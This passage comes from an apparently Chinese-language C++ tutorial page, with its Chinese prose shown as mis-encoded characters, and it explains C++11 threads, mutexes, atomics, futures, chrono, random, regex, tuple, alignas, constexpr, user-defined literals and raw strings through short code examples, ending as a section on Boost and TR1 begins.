å¹¶è¡Œç¼–ç¨‹"></a>18.7.1 å¹¶è¡Œç¼–ç¨‹</h3><p>C++11 é¦–æ¬¡åœ¨æ ‡å‡†åº“å±‚é¢æä¾›äº†å¯¹<strong>å¤šçº¿ç¨‹å¹¶å‘ç¼–ç¨‹</strong>çš„æ”¯æŒï¼Œä¸»è¦å®šä¹‰åœ¨ <code>&lt;thread&gt;</code>, <code>&lt;mutex&gt;</code>, <code>&lt;condition_variable&gt;</code>, <code>&lt;future&gt;</code>, <code>&lt;atomic&gt;</code> ç­‰å¤´æ–‡ä»¶ä¸­ã€‚</p><ul><li><strong><code>std::thread</code>:</strong> ç”¨äºåˆ›å»ºå’Œç®¡ç†çº¿ç¨‹ã€‚å…è®¸å‡½æ•°æˆ–å¯è°ƒç”¨å¯¹è±¡åœ¨ç‹¬ç«‹çš„çº¿ç¨‹ä¸­æ‰§è¡Œã€‚  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">worker_thread</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Worker thread running.\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::thread <span class="title">t</span><span class="params">(worker_thread)</span></span>; <span class="comment">// åˆ›å»ºæ–°çº¿ç¨‹å¹¶æ‰§è¡Œ worker_thread</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Main thread running.\n&quot;</span>;</span><br><span class="line">    t.join(); <span class="comment">// ç­‰å¾… worker_thread æ‰§è¡Œå®Œæ¯•</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong>äº’æ–¥é‡ (<code>std::mutex</code>, <code>std::lock_guard</code>, <code>std::unique_lock</code>):</strong> ç”¨äºä¿æŠ¤å…±äº«æ•°æ®ï¼Œé˜²æ­¢å¤šä¸ªçº¿ç¨‹åŒæ—¶è®¿é—®å¯¼è‡´çš„æ•°æ®ç«äº‰ã€‚<code>lock_guard</code> å’Œ <code>unique_lock</code> æä¾›äº† RAII é£æ ¼çš„é”ç®¡ç†ï¼Œç¡®ä¿äº’æ–¥é‡èƒ½è¢«æ­£ç¡®é‡Šæ”¾ã€‚  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mutex&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;thread&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::mutex data_mutex;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; shared_data;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_data</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::lock_guard&lt;<span class="built_in">std</span>::mutex&gt; <span class="title">lock</span><span class="params">(data_mutex)</span></span>; <span class="comment">// è‡ªåŠ¨åŠ é”ï¼Œç¦»å¼€ä½œç”¨åŸŸæ—¶è‡ªåŠ¨è§£é”</span></span><br><span class="line">    shared_data.push_back(val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>  <strong>æ¡ä»¶å˜é‡ (<code>std::condition_variable</code>):</strong> ç”¨äºçº¿ç¨‹é—´çš„åŒæ­¥ï¼Œå…è®¸ä¸€ä¸ªçº¿ç¨‹ç­‰å¾…æŸä¸ªæ¡ä»¶å˜ä¸ºçœŸï¼ˆç”±å¦ä¸€ä¸ªçº¿ç¨‹é€šçŸ¥ï¼‰ã€‚é€šå¸¸ä¸ <code>std::mutex</code> å’Œ <code>std::unique_lock</code> é…åˆä½¿ç”¨ã€‚</li><li><strong>åŸå­æ“ä½œ (<code>std::atomic&lt;T&gt;</code>):</strong> æä¾›å¯¹åŸºæœ¬ç±»å‹çš„åŸå­æ“ä½œï¼ˆå¦‚è¯»å–ã€å†™å…¥ã€å¢å‡ã€æ¯”è¾ƒäº¤æ¢ï¼‰ï¼Œä¿è¯è¿™äº›æ“ä½œåœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ä¸ä¼šè¢«æ‰“æ–­ï¼Œé¿å…äº†æ•°æ®ç«äº‰ï¼Œé€šå¸¸æ¯”ä½¿ç”¨äº’æ–¥é‡æ›´é«˜æ•ˆã€‚  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;atomic&gt;</span></span></span><br><span class="line"><span class="built_in">std</span>::atomic&lt;<span class="keyword">int</span>&gt; counter = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// counter++; // åŸå­åœ°è‡ªå¢</span></span><br></pre></td></tr></table></figure></li><li>  <strong>å¼‚æ­¥æ“ä½œ (<code>std::async</code>, <code>std::future</code>, <code>std::promise</code>):</strong> æä¾›äº†ä¸€ç§æ›´é«˜çº§çš„å¹¶å‘æ¨¡å‹ï¼Œå…è®¸å¼‚æ­¥åœ°æ‰§è¡Œä»»åŠ¡å¹¶è·å–å…¶ç»“æœã€‚<code>std::async</code> å¯ä»¥å¯åŠ¨ä¸€ä¸ªå¼‚æ­¥ä»»åŠ¡ï¼Œè¿”å›ä¸€ä¸ª <code>std::future</code> å¯¹è±¡ï¼Œé€šè¿‡ <code>future</code> å¯ä»¥åœ¨ç¨åè·å–ä»»åŠ¡çš„è¿”å›å€¼æˆ–ç­‰å¾…ä»»åŠ¡å®Œæˆã€‚<code>promise</code> åˆ™ç”¨äºåœ¨ä¸€ä¸ªçº¿ç¨‹ä¸­è®¾ç½®å€¼æˆ–å¼‚å¸¸ï¼Œä¾›å¦ä¸€ä¸ªçº¿ç¨‹é€šè¿‡å…³è”çš„ <code>future</code> è·å–ã€‚</li></ul><p>C++11 çš„å¹¶å‘æ”¯æŒä½¿å¾—ç¼–å†™å¯ç§»æ¤çš„å¤šçº¿ç¨‹ç¨‹åºæˆä¸ºå¯èƒ½ã€‚</p><h3 id="18-7-2-æ–°å¢çš„åº“"><a href="#18-7-2-æ–°å¢çš„åº“" class="headerlink" title="18.7.2 æ–°å¢çš„åº“"></a>18.7.2 æ–°å¢çš„åº“</h3><p>C++11 æ ‡å‡†åº“å¢åŠ äº†å‡ ä¸ªå®ç”¨çš„æ–°ç»„ä»¶ï¼š</p><ul><li><strong><code>&lt;chrono&gt;</code>:</strong> æä¾›äº†å¤„ç†<strong>æ—¶é—´</strong>å’Œ<strong>æ—¶é—´æ®µ</strong>çš„ç±»å‹å®‰å…¨ã€ç²¾ç¡®çš„åº“ã€‚åŒ…æ‹¬æ—¶é’Ÿ (<code>system_clock</code>, <code>steady_clock</code>, <code>high_resolution_clock</code>)ã€æ—¶é—´ç‚¹ (<code>time_point</code>) å’Œæ—¶é—´æ®µ (<code>duration</code>)ã€‚  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;chrono&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;thread&gt; // for sleep_for</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> start = <span class="built_in">std</span>::chrono::high_resolution_clock::now();</span><br><span class="line">    <span class="built_in">std</span>::this_thread::sleep_for(<span class="built_in">std</span>::chrono::milliseconds(<span class="number">50</span>)); <span class="comment">// ä¼‘çœ  50 æ¯«ç§’</span></span><br><span class="line">    <span class="keyword">auto</span> end = <span class="built_in">std</span>::chrono::high_resolution_clock::now();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::chrono::duration&lt;<span class="keyword">double</span>, <span class="built_in">std</span>::milli&gt; elapsed = end - start; <span class="comment">// è®¡ç®—æ¯«ç§’å·®</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Elapsed time: &quot;</span> &lt;&lt; elapsed.count() &lt;&lt; <span class="string">&quot; ms\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong><code>&lt;random&gt;</code>:</strong> æä¾›äº†æ¯” C é£æ ¼ <code>rand()</code> æ›´å¼ºå¤§ã€æ›´çµæ´»çš„<strong>éšæœºæ•°ç”Ÿæˆ</strong>å·¥å…·ã€‚åŒ…æ‹¬å¤šç§éšæœºæ•°å¼•æ“ï¼ˆå¦‚ <code>mt19937</code>ï¼‰å’Œåˆ†å¸ƒï¼ˆå¦‚ <code>uniform_int_distribution</code>, <code>normal_distribution</code>ï¼‰ã€‚  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;random&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::random_device rd; <span class="comment">// ç”¨äºç”Ÿæˆç§å­ (å¯èƒ½åŸºäºç¡¬ä»¶)</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::mt19937 <span class="title">gen</span><span class="params">(rd())</span></span>; <span class="comment">// Mersenne Twister å¼•æ“</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::uniform_int_distribution&lt;&gt; <span class="title">distrib</span><span class="params">(<span class="number">1</span>, <span class="number">6</span>)</span></span>; <span class="comment">// å‡åŒ€åˆ†å¸ƒ [1, 6]</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Rolling a die: &quot;</span> &lt;&lt; distrib(gen) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// ç”Ÿæˆéšæœºæ•°</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong><code>&lt;regex&gt;</code>:</strong> æä¾›äº†å¯¹<strong>æ­£åˆ™è¡¨è¾¾å¼ (Regular Expressions)</strong> çš„æ”¯æŒï¼Œç”¨äºå¼ºå¤§çš„æ–‡æœ¬æ¨¡å¼åŒ¹é…å’Œæœç´¢/æ›¿æ¢ã€‚  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;regex&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> text = <span class="string">&quot;Email: example@test.com&quot;</span>;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::regex <span class="title">email_regex</span><span class="params">(<span class="string">R&quot;(\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]&#123;2,&#125;\b)&quot;</span>)</span></span>; <span class="comment">// åŸå§‹å­—ç¬¦ä¸²å­—é¢é‡</span></span><br><span class="line">    <span class="built_in">std</span>::smatch match;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">std</span>::regex_search(text, match, email_regex)) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Found email: &quot;</span> &lt;&lt; match.str(<span class="number">0</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong><code>&lt;tuple&gt;</code>:</strong> æä¾›äº†<strong>å…ƒç»„ (Tuple)</strong> ç±»å‹ <code>std::tuple</code>ï¼Œå¯ä»¥çœ‹ä½œæ˜¯åŒ¿åçš„ã€å›ºå®šå¤§å°çš„å¼‚æ„å€¼é›†åˆï¼Œç±»ä¼¼äº <code>std::pair</code> çš„æ³›åŒ–ã€‚  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tuple&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::tuple&lt;int, std::string, double&gt; t1(10, &quot;hello&quot;, 3.14);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Tuple element 0: &quot;</span> &lt;&lt; <span class="built_in">std</span>::get&lt;<span class="number">0</span>&gt;(t1) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// ä½¿ç”¨ std::get&lt;i&gt; è®¿é—®</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Tuple element 1: &quot;</span> &lt;&lt; <span class="built_in">std</span>::get&lt;<span class="number">1</span>&gt;(t1) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// C++17 ç»“æ„åŒ–ç»‘å®šæ›´æ–¹ä¾¿: auto [id, name, value] = t1;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="18-7-3-ä½çº§ç¼–ç¨‹"><a href="#18-7-3-ä½çº§ç¼–ç¨‹" class="headerlink" title="18.7.3 ä½çº§ç¼–ç¨‹"></a>18.7.3 ä½çº§ç¼–ç¨‹</h3><p>C++11 ä¹Ÿå¢å¼ºäº†å¯¹åº•å±‚å†…å­˜å¸ƒå±€å’Œç¼–è¯‘æ—¶è®¡ç®—çš„æ”¯æŒï¼š</p><ul><li><strong>å¯¹é½æ§åˆ¶ (<code>alignas</code>, <code>alignof</code>):</strong><ul><li>  <code>alignas</code>: ç”¨äºæŒ‡å®šå˜é‡æˆ–ç±»å‹çš„<strong>å†…å­˜å¯¹é½è¦æ±‚</strong>ã€‚</li><li><code>alignof</code>: ç”¨äºæŸ¥è¯¢ç±»å‹æˆ–å¯¹è±¡çš„å¯¹é½è¦æ±‚ï¼ˆè¿”å›ä¸€ä¸ª <code>size_t</code>ï¼‰ã€‚<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">struct <span class="title">alignas</span><span class="params">(<span class="number">16</span>)</span> AlignedStruct </span>&#123; <span class="comment">// è¦æ±‚æŒ‰ 16 å­—èŠ‚å¯¹é½</span></span><br><span class="line">    <span class="keyword">char</span> data[<span class="number">32</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Alignment of int: &quot;</span> &lt;&lt; <span class="keyword">alignof</span>(<span class="keyword">int</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Alignment of AlignedStruct: &quot;</span> &lt;&lt; <span class="keyword">alignof</span>(AlignedStruct) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 16</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><strong><code>constexpr</code>:</strong> ç”¨äºå£°æ˜å‡½æ•°æˆ–å˜é‡å¯ä»¥åœ¨<strong>ç¼–è¯‘æ—¶</strong>æ±‚å€¼ã€‚<code>constexpr</code> å‡½æ•°å¯ä»¥åœ¨ç¼–è¯‘æ—¶ç”¨äºå¸¸é‡è¡¨è¾¾å¼ï¼Œä¹Ÿå¯ä»¥åœ¨è¿è¡Œæ—¶åƒæ™®é€šå‡½æ•°ä¸€æ ·ä½¿ç”¨ã€‚<code>constexpr</code> å˜é‡å¿…é¡»ç”¨å¸¸é‡è¡¨è¾¾å¼åˆå§‹åŒ–ã€‚è¿™ä½¿å¾—æ›´å¤šçš„è®¡ç®—å¯ä»¥åœ¨ç¼–è¯‘é˜¶æ®µå®Œæˆï¼Œæé«˜äº†è¿è¡Œæ—¶æ€§èƒ½å¹¶å¢å¼ºäº†å…ƒç¼–ç¨‹èƒ½åŠ›ã€‚  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;array&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// constexpr å‡½æ•°ï¼Œå¯åœ¨ç¼–è¯‘æ—¶è®¡ç®—</span></span><br><span class="line"><span class="function"><span class="keyword">constexpr</span> <span class="keyword">int</span> <span class="title">factorial</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (n &lt;= <span class="number">1</span>) ? <span class="number">1</span> : (n * factorial(n - <span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constexpr</span> <span class="keyword">int</span> five_factorial = factorial(<span class="number">5</span>); <span class="comment">// ç¼–è¯‘æ—¶è®¡ç®—ç»“æœä¸º 120</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">int</span>, factorial(4)&gt; arr; <span class="comment">// æ•°ç»„å¤§å°åœ¨ç¼–è¯‘æ—¶ç¡®å®šä¸º 24</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> runtime_val = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">int</span> six_factorial = factorial(runtime_val); <span class="comment">// è¿è¡Œæ—¶è®¡ç®—</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="18-7-4-æ‚é¡¹"><a href="#18-7-4-æ‚é¡¹" class="headerlink" title="18.7.4 æ‚é¡¹"></a>18.7.4 æ‚é¡¹</h3><ul><li><strong>ç”¨æˆ·å®šä¹‰å­—é¢é‡ (User-defined Literals):</strong> å…è®¸ç¨‹åºå‘˜ä¸ºå­—é¢é‡ï¼ˆå¦‚ <code>&quot;hello&quot;</code>, <code>123</code>, <code>3.14</code>ï¼‰å®šä¹‰åç¼€ï¼Œä»è€Œåˆ›å»ºå…·æœ‰ç‰¹å®šç±»å‹æˆ–æ„ä¹‰çš„å¯¹è±¡ã€‚åç¼€é€šå¸¸ä»¥ä¸‹åˆ’çº¿ <code>_</code> å¼€å¤´ã€‚  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;chrono&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰ä¸€ä¸ªå°†ç§’è½¬æ¢ä¸ºæ¯«ç§’çš„ç”¨æˆ·å®šä¹‰å­—é¢é‡åç¼€ _ms</span></span><br><span class="line"><span class="keyword">constexpr</span> <span class="built_in">std</span>::chrono::milliseconds <span class="keyword">operator</span><span class="string">&quot;&quot;</span> _ms(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> ms) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">std</span>::chrono::milliseconds(ms);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> duration = <span class="number">150</span>_ms; <span class="comment">// duration çš„ç±»å‹æ˜¯ std::chrono::millisecondsï¼Œå€¼ä¸º 150ms</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Duration: &quot;</span> &lt;&lt; duration.count() &lt;&lt; <span class="string">&quot;ms\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong>åŸå§‹å­—ç¬¦ä¸²å­—é¢é‡ (Raw String Literals):</strong> ç”¨äºç®€åŒ–åŒ…å«å¤§é‡ç‰¹æ®Šå­—ç¬¦ï¼ˆå¦‚åæ–œæ  <code>\</code>ã€å¼•å· <code>&quot;</code>ï¼‰çš„å­—ç¬¦ä¸²çš„å®šä¹‰ï¼Œé¿å…äº†ç¹ççš„è½¬ä¹‰ã€‚<ul><li>  è¯­æ³•ï¼š<code>R&quot;delimiter(raw_characters)delimiter&quot;</code></li><li><code>delimiter</code> æ˜¯å¯é€‰çš„åˆ†éš”ç¬¦åºåˆ—ï¼ˆä¸èƒ½åŒ…å«æ‹¬å·ã€åæ–œæ æˆ–ç©ºæ ¼ï¼‰ï¼Œç”¨äºåŒºåˆ†å­—ç¬¦ä¸²å†…å®¹å’Œç»“æŸæ ‡è®°ã€‚<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// æ— éœ€è½¬ä¹‰åæ–œæ å’Œå¼•å·</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> path = <span class="string">R&quot;(C:\Program Files\My App\data.txt)&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> html = <span class="string">R&quot;delimiter(</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;&lt;title&gt;&quot;Example&quot;&lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;Hello, world!&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">)delimiter&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; path &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; html &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><p>è¿™äº›åªæ˜¯ C++11 æ–°å¢åŠŸèƒ½çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒä»¬å…±åŒæ„æˆäº†ç°ä»£ C++ çš„åŸºç¡€ï¼Œä½¿å¾— C++ æˆä¸ºä¸€é—¨åŠŸèƒ½æ›´å¼ºå¤§ã€è¡¨è¾¾åŠ›æ›´å¼ºã€æ›´æ˜“äºä½¿ç”¨çš„ç¼–ç¨‹è¯­è¨€ã€‚</p><h2 id="18-8-è¯­è¨€å˜åŒ–"><a href="#18-8-è¯­è¨€å˜åŒ–" class="headerlink" title="18.8 è¯­è¨€å˜åŒ–"></a>18.8 è¯­è¨€å˜åŒ–</h2><p>C++ æ˜¯ä¸€é—¨ä¸æ–­å‘å±•çš„è¯­è¨€ã€‚ä» C++98/03 åˆ° C++11ï¼Œå†åˆ°åç»­çš„ C++14, C++17, C++20 ç­‰æ ‡å‡†ï¼Œè¯­è¨€æœ¬èº«å’Œæ ‡å‡†åº“éƒ½åœ¨æŒç»­æ¼”è¿›ï¼Œä»¥æ»¡è¶³ç°ä»£è½¯ä»¶å¼€å‘çš„éœ€æ±‚ã€‚C++11 æ˜¯ä¸€ä¸ªé‡Œç¨‹ç¢‘å¼çš„ç‰ˆæœ¬ï¼Œå¼•å…¥äº†å¤§é‡é‡è¦ç‰¹æ€§ï¼Œå…¶ä¸­è®¸å¤šç‰¹æ€§å¹¶éå‡­ç©ºå‡ºç°ï¼Œè€Œæ˜¯åœ¨æ ‡å‡†åŒ–ä¹‹å‰ç»è¿‡äº†ç¤¾åŒºçš„å¹¿æ³›è®¨è®ºå’Œå®è·µæ£€éªŒã€‚Boost åº“å’Œ TR1 åœ¨è¿™ä¸€è¿‡ç¨‹ä¸­æ‰®æ¼”äº†é‡è¦è§’è‰²ã€‚</p><h3 id="18-8-1-Boost-é¡¹ç›®"><a 